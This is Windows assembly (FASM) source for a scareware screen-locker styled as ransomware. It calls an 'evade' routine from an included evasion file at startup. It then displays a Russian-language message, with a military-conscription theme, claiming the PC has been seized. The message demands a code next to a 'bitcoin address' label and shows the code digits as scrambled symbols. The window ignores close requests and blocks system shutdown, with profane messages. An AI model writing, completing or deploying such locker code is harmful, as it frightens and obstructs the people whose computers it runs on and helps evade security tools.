format PE GUI 4.0
entry main
include 'win32wx.inc'
include 'encoding\win1251.inc'
include 'evasion.inc'
section '.text' code readable executable
main:
call evade
invoke LoadLibrary,rdll
invoke GetModuleHandle,0
mov [inst],eax
mov [wc.cbSize],48
mov [wc.style],CS_HREDRAW+CS_VREDRAW
mov [wc.lpfnWndProc],wndproc
mov [wc.cbClsExtra],0
mov [wc.cbWndExtra],0
mov eax,[inst]
mov [wc.hInstance],eax
invoke LoadIcon,eax,7
mov [wc.hIcon],eax
mov [wc.hIconSm],eax
invoke LoadCursor,0,IDC_ARROW
mov [wc.hCursor],eax
invoke GetStockObject,COLOR_WINDOW
mov [wc.hbrBackground],eax
mov [wc.lpszMenuName],0
mov [wc.lpszClassName],cls

invoke RegisterClassEx,wc
test eax,eax
jz .exit

invoke CreateWindowEx,WS_EX_DLGMODALFRAME,cls,wndtitle,\
    WS_VISIBLE+WS_CAPTION+WS_SYSMENU,\
    CW_USEDEFAULT,CW_USEDEFAULT,615,380,0,0,[inst],0
mov [hwnd],eax

.msg_loop:
invoke GetMessage,msg,0,0,0
test eax,eax
jz .exit
invoke TranslateMessage,msg
invoke DispatchMessage,msg
jmp .msg_loop

.exit:
invoke ExitProcess,0

proc wndproc hwnd,wmsg,wparam,lparam
cmp [wmsg],WM_CREATE
je .create
cmp [wmsg],WM_COMMAND
je .cmd
cmp [wmsg],WM_CLOSE
je .close
cmp [wmsg],WM_QUERYENDSESSION
je .queryend
cmp [wmsg],WM_DESTROY
je .destroy
invoke DefWindowProc,[hwnd],[wmsg],[wparam],[lparam]
ret

.create:
invoke CreateWindowEx,0,stccls,0,WS_CHILD+WS_VISIBLE+SS_BITMAP,5,5,384,384,[hwnd],101,[inst],0
mov [h_stc],eax
invoke LoadBitmap,[inst],100
invoke SendMessage,[h_stc],STM_SETIMAGE,IMAGE_BITMAP,eax

invoke CreateWindowEx,WS_EX_CLIENTEDGE,recls,0,\
    WS_CHILD+WS_VISIBLE+ES_MULTILINE+WS_VSCROLL+ES_READONLY,\
    400,5,195,300,[hwnd],102,[inst],0
mov [h_re],eax

invoke CreateWindowEx,WS_EX_CLIENTEDGE,edtcls,0,\
    WS_CHILD+WS_VISIBLE+ES_NUMBER,\
    400,315,130,22,[hwnd],103,[inst],0
mov [h_edt],eax

invoke CreateWindowEx,0,btncls,btntext,\
    WS_CHILD+WS_VISIBLE+BS_DEFPUSHBUTTON,\
    540,315,55,22,[hwnd],104,[inst],0
invoke GetTickCount
mov [seed],eax
stdcall nrand
mov ecx,900000
xor edx,edx
div ecx
add edx,100000
mov [code],edx
mov eax,[code]
mov ecx,10
lea edi,[ansibuf+6]
mov byte [edi],0
.loop:
dec edi
xor edx,edx
div ecx
mov dl,[cmap+edx]
mov [edi],dl
test eax,eax
jnz .loop
invoke MultiByteToWideChar,CP_ACP,0,ansibuf,-1,unibuf,8
cinvoke wsprintf,buf,fmt,txt,unibuf
invoke SetWindowText,[h_re],buf

invoke SetFocus,[h_edt]
xor eax,eax
ret

.cmd:
mov eax,[wparam]
cmp ax,104
je .ok
xor eax,eax
ret

.ok:
invoke GetDlgItemInt,[hwnd],103,0,0
cmp eax,[code]
je .match
invoke MessageBox,[hwnd],errmsg,errcap,MB_ICONERROR+MB_RIGHT
xor eax,eax
ret

.match:
invoke MessageBox,[hwnd],okmsg,okcap,MB_OK+MB_ICONINFORMATION
invoke DestroyWindow,[hwnd]
xor eax,eax
ret

.close:
invoke MessageBox,[hwnd],closemsg,closemsg,MB_ICONWARNING
xor eax,eax
inc eax
ret

.queryend:
invoke MessageBox,[hwnd],endsesmsg,endsescap,MB_ICONSTOP
xor eax,eax
ret

.destroy:
invoke PostQuitMessage,0
xor eax,eax
ret
endp

proc nrand
mov eax,[seed]
imul eax,214013
add eax,2531011
mov [seed],eax
shr eax,16
and eax,0x7FFF
ret
endp

section '.data' data readable writeable
inst dd ?
hwnd dd ?
code dd ?
seed dd ?
h_stc dd ?
h_re dd ?
h_edt dd ?
rdll du 'riched20.dll',0
cls du 'TTSKCLASS',0
stccls du 'STATIC',0
recls du 'RichEdit20W',0
edtcls du 'EDIT',0
btncls du 'BUTTON',0

wndtitle du 'Óïñ!',0
btntext du 'OK',0
fmt du '%s%s',0
txt du 'ВНИМАНИЕ! ВАШ ПК БЫЛ УПАКОВАН ТЦК!',13,10,'НАПИШИТЕ ПРАВИЛЬНЫЙ КОД И ВАС ОТПУСТЯТ!',13,10,13,10,'БИТКОИН АДДРЕСС: ',0
okmsg du 'ОТПУЩЕН, ТЦК ТЕБЯ НЕ ПАКУЕТ',0
okcap du 'ОТПУЩЕН',0
errmsg du 'НЕВЕРНО!',0
errcap du 'ТЦК УЖЕ БЛИЗИТСЯ К ТЕБЕ',0
closemsg du 'ШО С ТОБОЙ БЛЯТЬ!',0
endsesmsg du 'ИДИ НАХУЙ! Я НЕ ТАКОЙ ПРОСТОЙ!',0
endsescap du 'Я НЕ ДАМ ВЫРУБИТЬ КОМП ТЕБЕ ТАК ПРОСТО',0

cmap db 0xA7,0xB6,0xB1,0xAB,0xBB,0xC0,0xC1,0xC2,0xC3,0xC4
ansibuf db 8 dup (?)
unibuf du 8 dup (?)
buf du 512 dup (?)

wc WNDCLASSEX
msg MSG

section '.idata' import readable
library kernel32,'KERNEL32.DLL',user32,'USER32.DLL',gdi32,'GDI32.DLL'
include 'api\kernel32.inc'
include 'api\user32.inc'
include 'api\gdi32.inc'

section '.rsrc' resource data readable
directory 2,bitmaps,3,icons,14,icongroups
resource bitmaps,100,LANG_NEUTRAL,lockdata
resource icons,1,LANG_NEUTRAL,icondata
resource icongroups,1,LANG_NEUTRAL,mainicon
bitmap lockdata,'lock.bmp'
icon mainicon,icondata,'icon.ico'




